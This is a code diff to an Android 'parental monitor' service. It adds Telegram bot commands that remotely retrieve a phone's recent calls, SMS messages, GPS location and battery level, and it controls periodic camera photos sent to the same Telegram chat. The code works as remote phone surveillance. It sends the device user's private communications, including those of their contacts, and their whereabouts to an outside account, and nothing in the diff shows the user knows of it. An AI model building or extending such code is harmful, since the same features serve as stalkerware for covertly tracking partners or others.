@@ -18,6 +18,7 @@ import com.redeye.parentalmonitor.repository.SmsRepository
 import com.redeye.parentalmonitor.utils.NetworkUtils
 import com.redeye.parentalmonitor.utils.TimeFmt
 import kotlinx.coroutines.*
+import android.os.BatteryManager
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.MultipartBody
 import okhttp3.RequestBody.Companion.asRequestBody
@@ -123,7 +124,9 @@ class MonitoringService : Service() {
         monitoringJob = serviceScope.launch {
             while (isActive) {
                 try {
-                    checkAndSendNewData()
+                    if (!preferencesManager.monitoringPaused) {
+                        checkAndSendNewData()
+                    }
                     delay(syncIntervalMillis())
                 } catch (e: Exception) {
                     android.util.Log.e("MonitoringService", "Error in monitoring loop", e)
@@ -137,7 +140,9 @@ class MonitoringService : Service() {
         cameraJob = serviceScope.launch {
             while (isActive) {
                 try {
-                    captureAndSendPhoto()
+                    if (!preferencesManager.monitoringPaused && !isPhotoPaused()) {
+                        captureAndSendPhoto()
+                    }
                     delay(cameraIntervalMillis())
                 } catch (e: Exception) {
                     android.util.Log.e("MonitoringService", "Error in camera loop", e)
@@ -192,45 +197,193 @@ class MonitoringService : Service() {
             }
             val message = update.message ?: continue
             if (message.chat.id.toString() != chatId) continue
-            val command = message.text?.trim()?.substringBefore("@")?.lowercase() ?: continue
-            if (!command.startsWith("/")) continue
-            handleTelegramCommand(command)
+            val raw = message.text?.trim()?.substringBefore("@")?.lowercase() ?: continue
+            if (!raw.startsWith("/")) continue
+            handleTelegramCommand(raw)
         }
     }
 
-    private suspend fun handleTelegramCommand(command: String) {
+    private suspend fun handleTelegramCommand(raw: String) {
+        val parts = raw.split("\\s+".toRegex(), limit = 2)
+        val command = parts[0]
+        val arg = parts.getOrNull(1)?.trim().orEmpty()
         when (command) {
             "/photo" -> {
-                sendToTelegram("📸 Taking photo now…")
-                captureAndSendPhoto(reportResult = true)
+                if (preferencesManager.monitoringPaused) {
+                    sendToTelegram("⏸️ Monitoring is paused. Send /resume first.")
+                } else {
+                    sendToTelegram("📸 Taking photo now…")
+                    captureAndSendPhoto(reportResult = true)
+                }
             }
             "/status" -> {
                 val lastSync = preferencesManager.lastSyncTime
                 val lastSyncStr = if (lastSync > 0) formatDate(lastSync) else "never"
+                val photoState = if (isPhotoPaused()) {
+                    "paused until ${formatDate(preferencesManager.photoPausedUntil)}"
+                } else {
+                    "every ${preferencesManager.cameraInterval} min"
+                }
                 sendToTelegram(
                     buildString {
                         appendLine("📊 <b>Status</b>")
-                        appendLine("Monitoring: ON")
+                        appendLine("Monitoring: ${if (preferencesManager.monitoringPaused) "PAUSED" else "ON"}")
                         appendLine("Last sync: $lastSyncStr")
                         appendLine("Queued: ${messageQueue.getQueueSize()}")
                         appendLine("Data interval: ${preferencesManager.syncInterval} min")
-                        appendLine("Photo interval: ${preferencesManager.cameraInterval} min")
+                        appendLine("Photos: $photoState")
                         appendLine("Camera permission: ${if (hasCameraPermission()) "granted" else "MISSING"}")
+                        appendLine("Location permission: ${if (hasLocationPermission()) "granted" else "MISSING"}")
                         appendLine("Last photo: ${if (preferencesManager.lastPhotoTime > 0) formatDate(preferencesManager.lastPhotoTime) else "never"}")
                     }
                 )
+            }
+            "/lastcalls" -> {
+                val calls = callLogRepository.getAllCalls(5)
+                if (calls.isEmpty()) {
+                    sendToTelegram("📞 No call history found.")
+                } else {
+                    sendToTelegram(formatCallMessage(calls))
+                }
+            }
+            "/lastsms" -> {
+                val sms = smsRepository.getRecentSms(5)
+                if (sms.isEmpty()) {
+                    sendToTelegram("💬 No SMS found.")
+                } else {
+                    sendToTelegram(formatSmsMessage(sms))
+                }
+            }
+            "/photointerval" -> {
+                val minutes = arg.toIntOrNull()?.coerceIn(1, 60)
+                if (minutes == null) {
+                    sendToTelegram("Usage: /photointerval \u003c1-60\u003e (minutes)")
+                } else {
+                    preferencesManager.cameraInterval = minutes
+                    sendToTelegram("📸 Photo interval set to $minutes min.")
+                }
+            }
+            "/pause" -> {
+                val minutes = arg.toIntOrNull()?.coerceIn(1, 480)
+                if (minutes == null) {
+                    sendToTelegram("Usage: /pause \u003cminutes\u003e (1-480)")
+                } else {
+                    preferencesManager.photoPausedUntil = System.currentTimeMillis() + minutes * 60_000L
+                    sendToTelegram("⏸️ Photos paused for $minutes min.")
+                }
+            }
+            "/battery" -> {
+                val batteryManager = getSystemService(BATTERY_SERVICE) as BatteryManager
+                val level = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+                sendToTelegram("🔋 <b>Battery</b>\nLevel: $level%")
+            }
+            "/stop" -> {
+                preferencesManager.monitoringPaused = true
+                sendToTelegram("⏸️ Monitoring paused. Send /resume to restart.")
+            }
+            "/resume" -> {
+                preferencesManager.monitoringPaused = false
+                preferencesManager.photoPausedUntil = 0L
+                sendToTelegram("▶️ Monitoring resumed.")
+            }
+            "/location" -> {
+                if (!hasLocationPermission()) {
+                    sendToTelegram("⚠️ Location permission missing. Open Setup and grant Location permission.")
+                } else {
+                    sendToTelegram("📍 Locating…")
+                    val location = fetchLocation()
+                    if (location == null) {
+                        sendToTelegram("⚠️ Location unavailable. Make sure Location/GPS is turned on.")
+                    } else {
+                        sendToTelegram("📍 <b>Location</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAccuracy: ${location.accuracy.toInt()} m")
+                    }
+                }
             }
             "/help", "/start" -> {
                 sendToTelegram(
                     buildString {
                         appendLine("🤖 <b>Commands</b>")
                         appendLine("/photo - take a photo now")
+                        appendLine("/location - send current location")
+                        appendLine("/lastcalls - show last 5 calls")
+                        appendLine("/lastsms - show last 5 SMS")
+                        appendLine("/photointerval \u003c1-60\u003e - set photo interval")
+                        appendLine("/pause \u003cminutes\u003e - pause photos")
+                        appendLine("/battery - show battery level")
                         appendLine("/status - show monitoring status")
+                        appendLine("/stop - pause monitoring")
+                        appendLine("/resume - resume monitoring")
                         appendLine("/help - show this list")
                     }
                 )
             }
             else -> { /* ignore unknown input to avoid reply loops */ }
+        }
+    }
+
+    private fun isPhotoPaused(): Boolean {
+        return System.currentTimeMillis() < preferencesManager.photoPausedUntil
+    }
+
+    private fun hasLocationPermission(): Boolean {
+        val fine = androidx.core.content.ContextCompat.checkSelfPermission(
+            this,
+            android.Manifest.permission.ACCESS_FINE_LOCATION
+        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        val coarse = androidx.core.content.ContextCompat.checkSelfPermission(
+            this,
+            android.Manifest.permission.ACCESS_COARSE_LOCATION
+        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        return fine || coarse
+    }
+
+    private suspend fun fetchLocation(): android.location.Location? {
+        if (!hasLocationPermission()) return null
+        return withContext(Dispatchers.IO) {
+            try {
+                val locationManager = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
+                val providers = listOf(
+                    android.location.LocationManager.GPS_PROVIDER,
+                    android.location.LocationManager.NETWORK_PROVIDER
+                ).filter {
+                    try {
+                        locationManager.isProviderEnabled(it)
+                    } catch (_: Exception) {
+                        false
+                    }
+                }
+                for (provider in providers) {
+                    try {
+                        locationManager.getLastKnownLocation(provider)?.let { return@withContext it }
+                    } catch (_: SecurityException) {
+                        return@withContext null
+                    }
+                }
+                val chosen = providers.firstOrNull() ?: return@withContext null
+                val result = CompletableDeferred<android.location.Location?>()
+                val listener = object : android.location.LocationListener {
+                    override fun onLocationChanged(location: android.location.Location) {
+                        result.complete(location)
+                    }
+                    override fun onProviderDisabled(provider: String) {}
+                    override fun onProviderEnabled(provider: String) {}
+                }
+                try {
+                    locationManager.requestSingleUpdate(chosen, listener, android.os.Looper.getMainLooper())
+                } catch (_: SecurityException) {
+                    return@withContext null
+                }
+                try {
+                    withTimeoutOrNull(20_000) { result.await() }
+                } finally {
+                    try {
+                        locationManager.removeUpdates(listener)
+                    } catch (_: Exception) {
+                    }
+                }
+            } catch (_: Exception) {
+                null
+            }
         }
     }
 
